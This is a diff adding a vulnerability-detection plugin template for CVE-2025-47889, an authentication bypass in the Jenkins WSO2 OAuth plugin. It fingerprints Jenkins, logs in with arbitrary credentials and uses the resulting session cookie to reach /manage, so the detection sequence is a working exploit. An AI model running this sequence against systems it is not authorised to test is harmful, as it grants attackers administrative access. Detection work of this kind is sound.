@@ -1,0 +1,103 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Jenkins_CVE_2025_47889"
+  author: "alessandro-Doyensec"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-47889"
+  }
+  severity: CRITICAL
+  title: "Authentication bypass vulnerability in WSO2 Oauth Plugin (CVE-2025-47889)"
+  description: "In WSO2 Oauth Plugin 1.0 and earlier authentication claims are accepted without validation by the \"WSO2 Oauth\" security realm. This allows unauthenticated attackers to log in to controllers using this security realm using any username and any password, including usernames that do not exist."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-47889"
+  }
+}
+
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "jenkins_fingerprint"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>Dashboard [Jenkins]</title>" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "login_with_arbitrary_credentials"
+  http_request: {
+    method: POST
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
+    ]
+    uri: "/j_acegi_security_check"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    data: "j_username=aaaa&j_password=aaaa"
+    response: {
+      http_status: 302
+      extract_all: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "(JSESSIONID\\.[a-zA-Z0-9]+=[a-z0-9]+)"
+            variable_name: "session_cookie"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "authenticated_request"
+  http_request: {
+    method: GET
+    headers: [
+        { name: "Cookie" value: "{{ session_cookie }}" }
+    ]
+    uri: "/manage"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "jenkins_fingerprint",
+    "login_with_arbitrary_credentials",
+    "authenticated_request"
+  ]
+}
